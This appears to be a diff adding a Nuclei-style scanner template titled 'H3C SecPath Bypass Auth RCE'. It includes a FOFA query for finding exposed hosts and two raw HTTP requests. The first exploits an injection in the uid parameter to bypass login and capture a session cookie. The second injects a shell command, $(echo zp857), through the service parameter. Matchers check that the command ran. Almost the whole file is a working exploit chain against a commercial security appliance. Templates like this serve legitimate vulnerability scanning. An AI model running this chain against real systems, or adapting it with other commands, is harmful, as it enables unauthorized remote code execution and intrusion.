@@ -1,0 +1,40 @@
+id: h3c-secpath-rce
+
+info:
+  name: H3c Secpath Bypass Auth RCE
+  author: zp857
+  severity: critical
+  tags: h3c-secpath,rce
+  metadata:
+    fofa-query: 'body="H3C SecPath 运维审计系统"'
+
+requests:
+  - raw:
+      - |
+        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(echo%20zp857)&identity_cond=&query_type=all&format=json&browse=true HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+
+    extractors:
+      - type: regex
+        name: cookie
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - 'Set-Cookie: (.*?);'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "id"
+          - "zp857"
+
+      - type: status
+        status:
+          - 200
